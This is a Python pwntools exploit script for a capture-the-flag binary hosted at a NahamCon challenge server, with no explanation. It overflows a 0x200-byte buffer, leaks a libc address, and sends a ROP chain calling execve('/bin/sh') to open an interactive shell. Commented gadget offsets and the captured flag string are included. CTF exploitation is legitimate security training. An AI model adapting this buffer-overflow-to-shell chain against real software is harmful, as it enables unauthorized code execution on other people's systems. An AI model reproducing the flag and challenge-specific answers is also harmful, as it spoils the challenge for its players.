#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("all_patched_up_patched")
local = False 
if local:
    p = process("./all_patched_up_patched")
    gdb.attach(p,'''b*main+68\nc''')
else:
    p = remote('challenge.nahamcon.com', 32750)

elf = context.binary = ELF('./all_patched_up_patched', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)


#gadget
main = 0x4011a9
write_got = 0x404018
write_plt = 0x401060
'''
0x0000000000401252 : pop r15 ; mov rdi, 1 ; ret
0x000000000040115d : pop rbp ; ret
0x0000000000401253 : pop rdi ; mov rdi, 1 ; ret
libc = 0x403ff0

0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''
rdi_1_ret = 0x401254

##############
patch =  b'a'*0x200
payload = patch + p64(0x404220+0x200) + p64(main+27)
s(payload)

p.recvuntil(patch)
p.recv(20*8)
libc = int.from_bytes(p.recv(6), 'little') - 0x223190
log.info('Libc_base:    ' + hex(libc))
rdi_ret = 0x0000000000023b6a + libc
rsi = 0x000000000002601f + libc
rdx = 0x0000000000142c92 + libc
execve = 0x0000000000e3170 + libc
binsh = 1787325 + libc
ret = 0x0000000000022679 + libc
#payload = patch + p64(0x0) + p64(0x000000000002f709 + libc) + p64(0x0)+ p64(libc + 0xe3afe)
payload = patch + p64(0x0) + p64(rdi_ret) + p64(binsh) +  p64(rsi) + p64(0x0) +  p64(rdx) + p64(0x0) + p64(execve)
s(payload)
#0xe3b01
#0xe3b04

#flag{499c6288c77f297f4fd87db8e442e3f0}
p.interactive()